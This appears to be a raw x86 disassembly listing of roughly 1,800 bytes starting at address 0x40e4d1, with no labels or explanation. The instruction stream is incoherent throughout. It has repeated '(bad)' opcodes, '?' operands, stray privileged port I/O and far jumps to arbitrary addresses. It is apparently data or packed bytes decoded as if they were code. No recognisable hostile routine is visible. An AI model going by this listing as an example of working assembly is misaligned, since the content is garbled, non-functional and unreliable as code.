  40e4d1:	xlat   BYTE PTR ds:[ebx]
  40e4d2:	stc    
  40e4d3:	mov    dh,0xa9
  40e4d5:	loopne 0x40e544
  40e4d7:	sar    BYTE PTR [edx-0x5f],0xd5
  40e4db:	and    al,0x5b
  40e4dd:	cmp    BYTE PTR [ebp-0x1d],0xd4
  40e4e1:	sbb    ecx,esp
  40e4e3:	inc    esi
  40e4e4:	(bad)  
  40e4e5:	repz jecxz 0x40e561
  40e4e8:	mov    ebp,0x20747152
  40e4ed:	aas    
  40e4ee:	fist   WORD PTR [edi+0xba4ef53]
  40e4f4:	(bad)  
  40e4f6:	push   es
  40e4f7:	in     eax,dx
  40e4f8:	inc    ebp
  40e4f9:	scas   eax,DWORD PTR es:[edi]
  40e4fa:	repnz fcom DWORD PTR [ebx+edi*4+0x18e116c2]
  40e502:	mov    esi,0x19866ab0
  40e507:	sbb    bh,BYTE PTR [ecx]
  40e509:	push   0xbc73ce33
  40e50e:	fnstcw WORD PTR [ebp+eiz*8-0x6c]
  40e512:	test   BYTE PTR [edi],0xf9
  40e515:	test   BYTE PTR [esi+0x535dd1ef],dh
  40e51b:	sbb    eax,0x5d142a86
  40e520:	gs mov ah,0xae
  40e523:	sbb    eax,0x9ea39812
  40e528:	mov    edi,0x1254af46
  40e52d:	dec    edx
  40e52e:	(bad)  
  40e52f:	push   esi
  40e530:	jg     0x40e509
  40e532:	bound  edx,QWORD PTR [edx+0xe1faa37]
  40e538:	dec    esp
  40e539:	fnstenv [ecx+0x54ada192]
  40e53f:	xchg   ebp,eax
  40e540:	mov    WORD PTR [edi],es
  40e542:	mov    ds:0x62729b2c,eax
  40e547:	jbe    0x40e540
  40e549:	xchg   ecx,eax
  40e54a:	call   0xe36b864c
  40e54f:	or     edx,DWORD PTR [ecx]
  40e551:	cmp    cl,BYTE PTR [esi-0x64]
  40e554:	mov    al,ds:0xcdabf13d
  40e559:	push   ebp
  40e55a:	in     al,0xd2
  40e55c:	and    DWORD PTR [edx],0x587f7397
  40e562:	je     0x40e4e8
  40e564:	xchg   esi,eax
  40e565:	fldpi  
  40e567:	add    BYTE PTR [edi],dh
  40e569:	dec    eax
  40e56a:	sub    BYTE PTR [esi+0x15],ah
  40e56d:	leave  
  40e56e:	and    eax,0xd9e7d580
  40e573:	int    0x9b
  40e575:	sbb    eax,0xeac98df6
  40e57a:	inc    ecx
  40e57b:	sub    al,0x82
  40e57d:	adc    al,0xff
  40e57f:	inc    edi
  40e580:	fadd   st(2),st
  40e582:	push   eax
  40e583:	and    esp,esp
  40e585:	mov    cl,0xe4
  40e587:	jb     0x40e50f
  40e589:	pop    es
  40e58a:	fstp   TBYTE PTR [ecx+0x4217da2b]
  40e590:	pop    ds
  40e591:	sub    BYTE PTR [edi],0x3b
  40e594:	adc    esi,ebp
  40e596:	jg     0x40e5ee
  40e598:	xchg   edx,eax
  40e599:	mov    fs,WORD PTR [edi+0x67]
  40e59c:	fisttp DWORD PTR [edi+0xe]
  40e59f:	and    edi,DWORD PTR [eax-0x4b]
  40e5a2:	sub    DWORD PTR [esi+0x7b4cc0ca],edi
  40e5a8:	push   edx
  40e5a9:	pop    ebx
  40e5aa:	scas   eax,DWORD PTR es:[edi]
  40e5ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5ac:	xor    DWORD PTR [esi+0x58],ecx
  40e5af:	cwde   
  40e5b0:	outs   dx,DWORD PTR ds:[esi]
  40e5b1:	adc    al,0x6
  40e5b3:	push   ebx
  40e5b4:	xchg   esi,eax
  40e5b5:	push   edx
  40e5b6:	(bad)  
  40e5b7:	fiadd  DWORD PTR [edx]
  40e5b9:	dec    edi
  40e5ba:	or     eax,0xb90be74e
  40e5bf:	xor    DWORD PTR [esi+0x5c],esp
  40e5c2:	repnz push ebp
  40e5c4:	and    ebx,DWORD PTR [esi-0x55]
  40e5c7:	test   eax,0x65545cc6
  40e5cc:	iret   
  40e5cd:	sub    eax,0x7923cbe4
  40e5d2:	out    dx,al
  40e5d3:	or     DWORD PTR [edi+0x31],edx
  40e5d6:	inc    esi
  40e5d7:	jmp    0x40e5a5
  40e5d9:	dec    ecx
  40e5da:	jmp    0x40e65a
  40e5dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5dd:	mov    ds:0xc335cb7b,eax
  40e5e2:	addr16 pop edx
  40e5e4:	xchg   bh,dl
  40e5e6:	div    DWORD PTR [ebp+0x7ad1f6d]
  40e5ec:	cmp    DWORD PTR [esi+0x17b2218],ebp
  40e5f2:	scas   al,BYTE PTR es:[edi]
  40e5f3:	inc    edi
  40e5f4:	sub    al,0x72
  40e5f6:	cmp    eax,0x59fa3710
  40e5fb:	into   
  40e5fc:	sbb    ebp,DWORD PTR [ebp+edi*4+0xf]
  40e600:	cdq    
  40e601:	clc    
  40e602:	imul   ecx,DWORD PTR [eax],0x35
  40e605:	outs   dx,BYTE PTR ds:[esi]
  40e606:	leave  
  40e607:	add    eax,0xdc0dca7c
  40e60c:	add    ebx,ebp
  40e60e:	shl    BYTE PTR ss:[edi+ebx*8],1
  40e612:	loopne 0x40e68c
  40e614:	sti    
  40e615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e616:	mov    dh,0xd
  40e618:	fprem1 
  40e61a:	fdivr  DWORD PTR [ebx+0x9c7f416]
  40e620:	sub    eax,0x7d855d6a
  40e625:	mov    eax,ds:0xc3631bb5
  40e62a:	and    DWORD PTR [ecx-0xefb227c],edi
  40e630:	pop    edx
  40e631:	pop    esi
  40e632:	call   ebp
  40e634:	dec    eax
  40e635:	mov    ah,cl
  40e637:	mov    esi,0x78f69542
  40e63c:	scas   eax,DWORD PTR es:[edi]
  40e63d:	fcomp  st(7)
  40e63f:	neg    DWORD PTR [ebx]
  40e641:	mov    eax,ds:0xd3fbc3f9
  40e646:	std    
  40e647:	mov    ah,0xf0
  40e649:	sti    
  40e64a:	sbb    al,0x45
  40e64c:	inc    edx
  40e64d:	pop    es
  40e64e:	push   ebp
  40e64f:	push   0xc
  40e651:	cli    
  40e652:	add    bl,BYTE PTR [ebp-0x54]
  40e655:	push   cs
  40e656:	popf   
  40e657:	imul   edi,DWORD PTR [edi-0x79],0x72f3fea8
  40e65e:	call   0xb319e8e6
  40e663:	sub    cl,BYTE PTR [esp+esi*4+0x1dc53576]
  40e66a:	fist   DWORD PTR [eax+0x6]
  40e66d:	repz cld 
  40e66f:	int3   
  40e670:	add    eax,0x9346a435
  40e675:	adc    esp,0x79
  40e678:	dec    eax
  40e679:	not    DWORD PTR [edx-0x12f0fdad]
  40e67f:	ss push 0xbeee8704
  40e685:	xchg   ebx,eax
  40e686:	pop    edx
  40e687:	(bad)  [esi-0x470fb105]
  40e68d:	mov    edx,0xbef6a572
  40e692:	lods   eax,DWORD PTR ds:[esi]
  40e693:	jae    0x40e6c0
  40e695:	(bad)  
  40e696:	and    eax,0x1f732c1a
  40e69b:	mov    ah,0x22
  40e69d:	enter  0xd52c,0x5d
  40e6a1:	mov    esi,0x89446fd1
  40e6a6:	jbe    0x40e64b
  40e6a8:	or     BYTE PTR [ecx+0x688d2ee3],dl
  40e6ae:	jmp    0xa4a1:0x889c2486
  40e6b5:	scas   al,BYTE PTR es:[edi]
  40e6b6:	inc    eax
  40e6b7:	iret   
  40e6b8:	or     BYTE PTR [ebp+0x5067c3b8],bl
  40e6be:	out    dx,eax
  40e6bf:	dec    ebp
  40e6c0:	mov    edx,0xca5373a3
  40e6c5:	scas   al,BYTE PTR es:[edi]
  40e6c6:	fs pusha 
  40e6c8:	int    0xa2
  40e6ca:	je     0x40e679
  40e6cc:	jmp    0xebc67bf3
  40e6d1:	sbb    DWORD PTR [esi+0x17],ebp
  40e6d4:	push   ebx
  40e6d5:	dec    edi
  40e6d6:	into   
  40e6d7:	out    dx,al
  40e6d8:	fisttp DWORD PTR ds:0x9bcc9a88
  40e6de:	fild   QWORD PTR [edx+0x7d5dbfe4]
  40e6e4:	xrelease mov DWORD PTR [ebx-0x4],eax
  40e6e8:	dec    edi
  40e6e9:	pop    es
  40e6ea:	ja     0x40e736
  40e6ec:	bound  ecx,QWORD PTR [edi-0x3b]
  40e6ef:	in     al,dx
  40e6f0:	sub    al,0xbc
  40e6f2:	xchg   edx,eax
  40e6f3:	and    eax,DWORD PTR [edx]
  40e6f5:	scas   eax,DWORD PTR es:[edi]
  40e6f6:	pop    edi
  40e6f7:	sbb    esi,DWORD PTR [edi+0x14f8aa7e]
  40e6fd:	int    0x6f
  40e6ff:	mov    DWORD PTR [edx-0x68],ebx
  40e702:	div    DWORD PTR [ebp-0x4d]
  40e705:	sub    BYTE PTR [edi],cl
  40e707:	add    esp,DWORD PTR [esi]
  40e709:	pop    ebp
  40e70a:	pushf  
  40e70b:	pop    ds
  40e70c:	scas   eax,DWORD PTR es:[edi]
  40e70d:	cmp    ah,BYTE PTR [edi-0x2b3f9c84]
  40e713:	loope  0x40e703
  40e715:	imul   ecx,eax,0x31
  40e718:	push   ds
  40e719:	hlt    
  40e71a:	int    0x6
  40e71c:	mov    bh,0x73
  40e71e:	inc    ebp
  40e71f:	inc    esi
  40e720:	and    DWORD PTR [ecx+0x26],edi
  40e723:	icebp  
  40e724:	fcomp  DWORD PTR [esi]
  40e726:	lahf   
  40e727:	jno    0x40e6fc
  40e729:	inc    ebx
  40e72a:	repz fidiv WORD PTR [ecx]
  40e72d:	aam    0xb
  40e72f:	pushf  
  40e730:	into   
  40e731:	mov    esp,0x74312672
  40e736:	cmp    eax,0xb3f01bc2
  40e73b:	(bad)
  40e73e:	and    ebx,DWORD PTR [eax-0x26]
  40e741:	or     eax,DWORD PTR [edi]
  40e743:	mov    BYTE PTR ds:0x7ee80285,bh
  40e749:	ret    
  40e74a:	cld    
  40e74b:	inc    esp
  40e74c:	adc    DWORD PTR [ecx],edx
  40e74e:	ja     0x40e748
  40e750:	xchg   BYTE PTR [edi],dl
  40e752:	mov    bl,0x68
  40e754:	aaa    
  40e755:	push   esp
  40e756:	scas   eax,DWORD PTR es:[edi]
  40e757:	adc    DWORD PTR [edi],0xffffffa9
  40e75a:	lods   eax,DWORD PTR ds:[esi]
  40e75b:	cs sub edi,edx
  40e75e:	jle    0x40e6e9
  40e760:	jl     0x40e6e3
  40e762:	sbb    edi,DWORD PTR [edi+edx*1]
  40e765:	pushw  es
  40e767:	(bad)  
  40e768:	ror    ebp,cl
  40e76a:	sbb    ebx,DWORD PTR [ecx]
  40e76c:	sbb    edx,0xffffff89
  40e76f:	pop    ebx
  40e770:	leave  
  40e771:	les    esp,FWORD PTR [eax+0xadfbe17]
  40e777:	push   0xe9897d47
  40e77c:	mov    eax,0x441efd13
  40e781:	xchg   BYTE PTR [edx-0x3c],al
  40e784:	popa   
  40e785:	or     DWORD PTR [esi+0x12e1dd70],ebp
  40e78b:	retf   
  40e78c:	std    
  40e78d:	sti    
  40e78e:	popa   
  40e78f:	repnz ror DWORD PTR [ecx+0x11],cl
  40e793:	push   ss
  40e794:	in     eax,dx
  40e795:	xchg   DWORD PTR [ebp-0x3e],ebx
  40e798:	inc    ebx
  40e799:	sub    DWORD PTR [ebx],ecx
  40e79b:	das    
  40e79c:	cmp    al,BYTE PTR [edi-0x609e7397]
  40e7a2:	test   edx,ebx
  40e7a4:	mov    ebp,DWORD PTR [esi-0x69]
  40e7a7:	jg     0x40e772
  40e7a9:	xchg   esi,eax
  40e7aa:	dec    ebx
  40e7ab:	add    eax,DWORD PTR [ebp+eax*4+0x10]
  40e7af:	and    ebx,DWORD PTR [eax]
  40e7b1:	pop    edi
  40e7b2:	mov    edx,0xccd70866
  40e7b7:	jmp    0x40e75d
  40e7b9:	mov    eax,ds:0x8178c7e1
  40e7be:	cmp    esi,0x24d8b214
  40e7c4:	xchg   ebx,eax
  40e7c5:	mov    edx,edi
  40e7c7:	add    eax,0xa5333263
  40e7cc:	adc    eax,0x6afc80f9
  40e7d1:	std    
  40e7d2:	inc    ebp
  40e7d3:	scas   eax,DWORD PTR es:[edi]
  40e7d4:	retf   
  40e7d5:	retf   0x2a95
  40e7d8:	cmp    eax,0xefccbb1a
  40e7dd:	add    dl,bl
  40e7df:	cmp    BYTE PTR [ecx-0x1caa726],0x32
  40e7e6:	or     cl,cl
  40e7e8:	adc    al,al
  40e7ea:	imul   dh
  40e7ec:	sub    eax,0x67a44c93
  40e7f1:	mov    esi,0xab8b15be
  40e7f6:	imul   ecx,esp,0xffffffae
  40e7f9:	fdiv   DWORD PTR [eax-0x4b]
  40e7fc:	and    eax,0xb45efc65
  40e801:	aas    
  40e802:	cmc    
  40e803:	push   ebp
  40e804:	inc    ebx
  40e805:	lods   eax,DWORD PTR ds:[esi]
  40e806:	dec    eax
  40e807:	jp     0x40e82b
  40e809:	mov    bh,0xbe
  40e80b:	add    ch,bh
  40e80d:	jl     0x40e82a
  40e80f:	cld    
  40e810:	push   es
  40e811:	jecxz  0x40e80d
  40e813:	loope  0x40e7cc
  40e815:	sub    BYTE PTR [ebp-0x2c4871c],ch
  40e81b:	inc    edi
  40e81c:	push   eax
  40e81d:	aaa    
  40e81e:	cli    
  40e81f:	jno    0x40e88e
  40e821:	inc    eax
  40e822:	stc    
  40e823:	std    
  40e824:	fwait
  40e825:	popf   
  40e826:	xchg   esp,eax
  40e827:	dec    esi
  40e828:	lock jle 0x40e80d
  40e82b:	fwait
  40e82c:	dec    esp
  40e82d:	fcmove st,st(7)
  40e82f:	cmp    al,0x71
  40e831:	(bad)  
  40e832:	jecxz  0x40e887
  40e834:	ja     0x40e81f
  40e836:	stos   DWORD PTR es:[edi],eax
  40e837:	popf   
  40e838:	jge    0x40e809
  40e83a:	jge    0x40e823
  40e83c:	add    eax,0x1263956b
  40e841:	jle    0x40e85e
  40e843:	or     al,0xb2
  40e845:	and    ebx,eax
  40e847:	sub    ah,BYTE PTR [esp+esi*8-0x1abc42ca]
  40e84e:	mov    edi,0x1ae59ae
  40e853:	inc    esp
  40e854:	xchg   ecx,eax
  40e855:	adc    eax,0x803c0e71
  40e85a:	jnp    0x40e887
  40e85c:	fistp  DWORD PTR [eax+0x38894132]
  40e862:	cld    
  40e863:	mov    ah,0x7f
  40e865:	fst    st(1)
  40e867:	add    BYTE PTR [ebx+0x5fb3cf2],dh
  40e86d:	leave  
  40e86e:	repnz test BYTE PTR [ecx-0x8],al
  40e872:	jp     0x40e8ba
  40e874:	sub    ebx,eax
  40e876:	push   ss
  40e877:	lds    esi,FWORD PTR [edx-0x14]
  40e87a:	and    al,0xe1
  40e87c:	lods   eax,DWORD PTR ds:[esi]
  40e87d:	mov    DWORD PTR [edi+0x1fefcd66],eax
  40e883:	cmp    esp,edx
  40e885:	cmp    al,0x53
  40e887:	inc    ecx
  40e888:	ret    
  40e889:	test   DWORD PTR [edx+ebx*1],esi
  40e88c:	imul   esp,DWORD PTR [eax],0xb
  40e88f:	cmc    
  40e890:	cwde   
  40e891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e892:	jmp    0x5b4f:0xe36827d2
  40e899:	mov    fs,edx
  40e89b:	xchg   DWORD PTR [edi-0x6f7c6d60],ebp
  40e8a1:	sub    dl,BYTE PTR [ebp-0x20]
  40e8a4:	lods   al,BYTE PTR ds:[esi]
  40e8a5:	out    0x11,eax
  40e8a7:	xor    al,0x35
  40e8a9:	lea    eax,[ebp-0x341d4bd7]
  40e8af:	adc    DWORD PTR [edx],ecx
  40e8b1:	sbb    eax,0xc83d0479
  40e8b6:	stos   DWORD PTR es:[edi],eax
  40e8b7:	jo     0x40e843
  40e8b9:	push   edi
  40e8ba:	ret    0xaeee
  40e8bd:	(bad)  
  40e8be:	(bad)  
  40e8bf:	mov    DWORD PTR [esi+0x4f],esp
  40e8c2:	loop   0x40e8e6
  40e8c4:	in     al,dx
  40e8c5:	adc    DWORD PTR [ecx],ecx
  40e8c7:	adc    eax,DWORD PTR [eax]
  40e8c9:	dec    ebx
  40e8ca:	dec    esp
  40e8cb:	pop    ebx
  40e8cc:	dec    ecx
  40e8cd:	fisub  DWORD PTR [ecx]
  40e8cf:	mov    eax,0xfb2bb3ab
  40e8d4:	cdq    
  40e8d5:	enter  0xa544,0xdf
  40e8d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8db:	fisubr DWORD PTR [edx]
  40e8dd:	push   cs
  40e8de:	sub    ebp,esi
  40e8e0:	and    eax,0x8d20dae0
  40e8e5:	jp     0x40e92b
  40e8e7:	repz push ss
  40e8e9:	jl     0x40e8f5
  40e8eb:	inc    esp
  40e8ec:	mov    ecx,0x6b1f96bf
  40e8f1:	push   eax
  40e8f2:	stc    
  40e8f3:	test   eax,0xa1d40749
  40e8f8:	xchg   esi,eax
  40e8f9:	iret   
  40e8fa:	push   ds
  40e8fb:	ret    0x799
  40e8fe:	cmp    BYTE PTR [ebx],dh
  40e900:	pop    ds
  40e901:	xlat   BYTE PTR ds:[ebx]
  40e902:	xchg   esi,eax
  40e903:	call   0x6c4:0xf0486e78
  40e90a:	aam    0xec
  40e90c:	out    dx,al
  40e90d:	xchg   ecx,eax
  40e90e:	mov    eax,ds:0x3f050e89
  40e913:	dec    ebp
  40e914:	out    0xd0,al
  40e916:	and    ch,bl
  40e918:	mov    al,ds:0x52e854e3
  40e91d:	mov    eax,ds:0xb5b92918
  40e922:	test   al,0x7c
  40e924:	push   edx
  40e925:	inc    eax
  40e926:	push   esp
  40e927:	addr16 js 0x40e925
  40e92a:	dec    edi
  40e92b:	(bad)
  40e92e:	lods   eax,DWORD PTR ds:[esi]
  40e92f:	(bad)  
  40e931:	data16 sbb bl,BYTE PTR [eax]
  40e934:	pop    eax
  40e935:	xchg   ebx,eax
  40e936:	aaa    
  40e937:	(bad)  
  40e938:	mov    edx,0x788d7440
  40e93d:	pop    ds
  40e93e:	js     0x40e8f9
  40e940:	dec    ecx
  40e941:	iret   
  40e942:	out    0x13,eax
  40e944:	mov    ds:0x8180e64b,al
  40e949:	sub    ebx,DWORD PTR [esi-0x19]
  40e94c:	test   al,0x8a
  40e94e:	cmp    BYTE PTR [eax+0x7b],ah
  40e951:	mov    dh,0xcf
  40e953:	push   0xffffffaf
  40e955:	lods   al,BYTE PTR ds:[esi]
  40e956:	lock unpckhps xmm3,XMMWORD PTR [ebx]
  40e95a:	ds xchg edi,eax
  40e95c:	push   esp
  40e95d:	jmp    0x40e996
  40e95f:	outs   dx,DWORD PTR cs:[esi]
  40e961:	sub    eax,0x8980829c
  40e966:	in     eax,0x80
  40e968:	inc    edi
  40e969:	out    0x3,al
  40e96b:	gs sub eax,0x6cf3a865
  40e971:	das    
  40e972:	fldl2t 
  40e974:	dec    edi
  40e975:	popa   
  40e976:	sub    dh,BYTE PTR [ebp+ecx*8+0x5d601c9]
  40e97d:	pop    ebp
  40e97e:	add    dh,ch
  40e980:	dec    ecx
  40e981:	add    esi,DWORD PTR [ebx+0xc]
  40e984:	test   eax,0x3f770390
  40e989:	or     BYTE PTR [edi+esi*1+0x1d50a379],bl
  40e990:	xor    BYTE PTR [eax+0x41],al
  40e993:	cmp    eax,0x6dd996f0
  40e998:	into   
  40e999:	sub    eax,0x44bba60e
  40e99e:	mov    ds:0xfb6b76f8,eax
  40e9a3:	dec    eax
  40e9a4:	pop    esp
  40e9a5:	icebp  
  40e9a6:	xor    al,0x16
  40e9a8:	pushf  
  40e9a9:	call   0xfef92208
  40e9ae:	mov    ds:0xe72cfb00,al
  40e9b3:	sbb    DWORD PTR [ebx-0x54f8632b],eax
  40e9b9:	or     edi,DWORD PTR [edx+eiz*8+0x2b]
  40e9bd:	cdq    
  40e9be:	pop    edx
  40e9bf:	pop    edx
  40e9c0:	push   ecx
  40e9c1:	clc    
  40e9c2:	int    0xab
  40e9c4:	or     ah,BYTE PTR [ebx]
  40e9c6:	xor    eax,0xe6baaaf3
  40e9cb:	or     al,0xf1
  40e9cd:	out    0x66,al
  40e9cf:	scas   al,BYTE PTR es:[edi]
  40e9d0:	ret    
  40e9d1:	pop    esi
  40e9d2:	dec    ebp
  40e9d3:	jmp    DWORD PTR [edx+0x21]
  40e9d6:	cli    
  40e9d7:	add    edx,esi
  40e9d9:	pop    ecx
  40e9da:	xchg   esp,eax
  40e9db:	stc    
  40e9dc:	inc    eax
  40e9dd:	pop    edi
  40e9de:	cmp    DWORD PTR [eax+ebp*2],eax
  40e9e1:	push   ecx
  40e9e2:	fcom   QWORD PTR ds:0x6c0dd78c
  40e9e8:	xor    al,0x82
  40e9ea:	cmp    BYTE PTR [edi],al
  40e9ec:	fmul   st,st(3)
  40e9ee:	mov    WORD PTR [ebx],ss
  40e9f0:	(bad)  
  40e9f1:	push   edi
  40e9f2:	jnp    0x40ea58
  40e9f4:	arpl   WORD PTR [esi],di
  40e9f6:	loop   0x40ea2b
  40e9f8:	sub    BYTE PTR [esi],0xb7
  40e9fb:	jns    0x40e98f
  40e9fd:	or     bl,dl
  40e9ff:	add    dh,cl
  40ea01:	scas   eax,DWORD PTR es:[edi]
  40ea02:	ret    0xc045
  40ea05:	push   ebx
  40ea06:	sbb    BYTE PTR [edi+0x43],al
  40ea09:	mov    eax,0x37db3ec3
  40ea0e:	mov    ah,0x83
  40ea10:	scas   eax,DWORD PTR es:[edi]
  40ea11:	xchg   edx,eax
  40ea12:	clc    
  40ea13:	push   0xa240873a
  40ea18:	les    edx,FWORD PTR [edx+0x61]
  40ea1b:	dec    ecx
  40ea1c:	pop    edi
  40ea1d:	jne    0x40ea98
  40ea1f:	push   es
  40ea20:	bound  edx,QWORD PTR [ebp-0x2f7ea02e]
  40ea26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea27:	inc    edi
  40ea28:	pop    ebp
  40ea29:	jmp    0xa4ccc0df
  40ea2e:	gs pop ecx
  40ea30:	std    
  40ea31:	fwait
  40ea32:	sub    edx,DWORD PTR [eax*8+0x3bcf42d0]
  40ea39:	add    edx,ebx
  40ea3b:	fisubr WORD PTR [ebp-0x6d]
  40ea3e:	cwde   
  40ea3f:	imul   edi,DWORD PTR ds:0xe13a4c1,0xa4faa2fd
  40ea49:	adc    dh,BYTE PTR [ecx]
  40ea4b:	or     edi,ebx
  40ea4d:	add    eax,ebp
  40ea4f:	cmp    BYTE PTR [ebp-0x1b6f4c9b],al
  40ea55:	pop    edi
  40ea56:	cmp    al,0x61
  40ea58:	lahf   
  40ea59:	pop    esp
  40ea5a:	dec    ebx
  40ea5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea5c:	jmp    0xd7e23604
  40ea61:	div    BYTE PTR [edx-0x16]
  40ea64:	pop    edx
  40ea65:	fild   WORD PTR [edx]
  40ea67:	xchg   ebp,eax
  40ea68:	fmul   QWORD PTR [esi+0x747fa8ec]
  40ea6e:	data16 cmp dh,BYTE PTR [edx+0x3a]
  40ea72:	pop    ecx
  40ea73:	repnz xchg esp,eax
  40ea75:	and    al,0x3d
  40ea77:	pop    ebp
  40ea78:	(bad)  
  40ea79:	les    ecx,FWORD PTR [ebx-0x3335f997]
  40ea7f:	loope  0x40eaa0
  40ea81:	sqrtps xmm6,XMMWORD PTR [edx-0x5ff133d6]
  40ea88:	sbb    al,0x77
  40ea8a:	inc    esi
  40ea8b:	pop    eax
  40ea8c:	mov    ecx,DWORD PTR [ecx-0x8]
  40ea8f:	dec    edx
  40ea90:	adc    DWORD PTR [ecx+0x3caaa232],esi
  40ea96:	cmp    BYTE PTR [esi],0xe6
  40ea99:	je     0x40eaf4
  40ea9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea9c:	xor    ch,BYTE PTR [ecx+0x4ddd95d7]
  40eaa2:	popf   
  40eaa3:	pop    eax
  40eaa4:	aad    0x97
  40eaa6:	mov    bl,0x4a
  40eaa8:	int    0x16
  40eaaa:	iret   
  40eaab:	out    dx,eax
  40eaac:	jns    0x40eac9
  40eaae:	sbb    eax,0x16a73874
  40eab3:	push   ss
  40eab4:	loopne 0x40eb01
  40eab6:	sahf   
  40eab7:	mov    WORD PTR [ebx],?
  40eab9:	ins    BYTE PTR es:[edi],dx
  40eaba:	sub    eax,esi
  40eabc:	jne    0x40ea83
  40eabe:	popa   
  40eabf:	aaa    
  40eac0:	cwde   
  40eac1:	xchg   esi,eax
  40eac2:	sar    edx,cl
  40eac4:	xchg   esp,eax
  40eac5:	fisubr WORD PTR [eax-0x38]
  40eac8:	or     BYTE PTR [esi],dh
  40eaca:	mov    ds:0x1c1fd603,al
  40eacf:	(bad)  
  40ead0:	push   0x1a
  40ead2:	cmp    ecx,DWORD PTR [edx+0x2b58dca6]
  40ead8:	aad    0xe5
  40eada:	outs   dx,DWORD PTR ds:[esi]
  40eadb:	outs   dx,DWORD PTR ds:[esi]
  40eadc:	(bad)  
  40eadd:	mov    dh,0x61
  40eadf:	sub    eax,0x34f890b6
  40eae4:	inc    esi
  40eae5:	out    dx,al
  40eae6:	shr    esp,1
  40eae8:	cmp    ah,BYTE PTR [eax+0x496f756d]
  40eaee:	mov    ?,WORD PTR [edi+0x2d]
  40eaf1:	lods   al,BYTE PTR ds:[esi]
  40eaf2:	(bad)  
  40eaf3:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaf5:	pop    eax
  40eaf6:	and    BYTE PTR [edi],0x5f
  40eaf9:	mov    ch,0x1f
  40eafb:	int    0x9
  40eafd:	mov    edi,0xb081f41c
  40eb02:	aad    0x99
  40eb04:	stc    
  40eb05:	mov    WORD PTR [ebx],fs
  40eb07:	jmp    0x40eb13
  40eb09:	out    dx,eax
  40eb0a:	xchg   edi,eax
  40eb0b:	pop    ecx
  40eb0c:	adc    ebp,DWORD PTR [esi+esi*4-0x592e6d7a]
  40eb13:	imul   esi,DWORD PTR [ebp-0x517c9d58],0x945468ad
  40eb1d:	push   ebx
  40eb1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb1f:	mov    eax,0x24f28d33
  40eb24:	sbb    bh,BYTE PTR [edx-0x2dfb8190]
  40eb2a:	jle    0x40eba3
  40eb2c:	scas   eax,DWORD PTR es:[edi]
  40eb2d:	jp     0x40eaf4
  40eb2f:	fucomip st,st(4)
  40eb31:	repz ret 
  40eb33:	push   0x42
  40eb35:	or     dh,BYTE PTR [ebx-0x6c]
  40eb38:	push   ss
  40eb39:	jge    0x40ebb8
  40eb3b:	sub    eax,0xb2a93c00
  40eb40:	xchg   esp,eax
  40eb41:	pop    ebx
  40eb42:	ja     0x40eb91
  40eb44:	inc    ebx
  40eb45:	sbb    al,0xd5
  40eb47:	push   ebp
  40eb48:	and    esi,ebx
  40eb4a:	mov    ds:0x41f59993,al
  40eb4f:	xchg   esi,eax
  40eb50:	out    dx,al
  40eb51:	adc    al,0x3f
  40eb53:	adc    DWORD PTR [ebx+0x5e],eax
  40eb56:	or     eax,DWORD PTR [esi]
  40eb58:	inc    esp
  40eb59:	lods   eax,DWORD PTR ds:[esi]
  40eb5a:	cmp    al,cl
  40eb5c:	mov    dh,0x6b
  40eb5e:	or     al,0xc1
  40eb60:	sbb    DWORD PTR [eax+0x43],0xf00e46f
  40eb67:	cmc    
  40eb68:	retf   
  40eb69:	(bad)
  40eb6c:	sbb    DWORD PTR [eax+0x6d],ebp
  40eb6f:	jae    0x40eba3
  40eb71:	push   esi
  40eb72:	cmc    
  40eb73:	ret    
  40eb74:	pop    ebx
  40eb75:	push   0x1216d117
  40eb7a:	add    bh,dh
  40eb7c:	xchg   ebp,eax
  40eb7d:	aad    0x61
  40eb7f:	retf   
  40eb80:	pop    edi
  40eb81:	lea    eax,[ecx+0x3f9228a7]
  40eb87:	cmp    DWORD PTR [eax+0x620ebc62],edi
  40eb8d:	sub    BYTE PTR [eax+0x69d93ab7],0x7a
  40eb94:	xor    ch,cl
  40eb96:	daa    
  40eb97:	sub    BYTE PTR [ebx+0x25],bl
  40eb9a:	sahf   
  40eb9b:	pop    esi
  40eb9c:	aaa    
  40eb9d:	jnp    0x40ebea
  40eb9f:	cwde   
  40eba0:	and    DWORD PTR [eax],esp
  40eba2:	push   esp
  40eba3:	add    ecx,esi
  40eba5:	lds    ebp,FWORD PTR [ebp+0x35b98767]
  40ebab:	fsubrp st(3),st
  40ebad:	cmp    dh,ah
  40ebaf:	test   bl,ah
  40ebb1:	jb     0x40eb8a
  40ebb3:	or     cl,BYTE PTR [edx]
  40ebb5:	jno    0x40ec0c
  40ebb7:	and    esp,DWORD PTR [ecx]
  40ebb9:	mov    edi,0x7c173c71
  40ebbe:	lock cmp dh,BYTE PTR [ebx+0x1b6c4049]
  40ebc5:	cld    
  40ebc6:	sub    DWORD PTR [edi-0x40],ebx
  40ebc9:	xchg   ecx,eax
  40ebca:	call   0x9be16af9
  40ebcf:	and    cl,ah
  40ebd1:	push   esp
  40ebd2:	leave  
  40ebd3:	ins    BYTE PTR es:[edi],dx
  40ebd4:	mov    ch,0xe6
  40ebd6:	fmul   QWORD PTR [esi]
  40ebd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebd9:	mov    ch,BYTE PTR [ebx+0x1f]
  40ebdc:	and    ch,BYTE PTR [ecx-0x33]
  40ebdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebe0:	mov    ebx,0xb816082
  40ebe5:	dec    edx
  40ebe6:	push   cs
  40ebe7:	jmp    0x40ebaa
  40ebe9:	rcl    DWORD PTR [ecx-0x488572db],1
  40ebef:	scas   eax,DWORD PTR es:[edi]
  40ebf0:	mov    ecx,0xc7a8244f
  40ebf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebf6:	dec    ebx
  40ebf7:	rcr    BYTE PTR fs:[ebx],cl
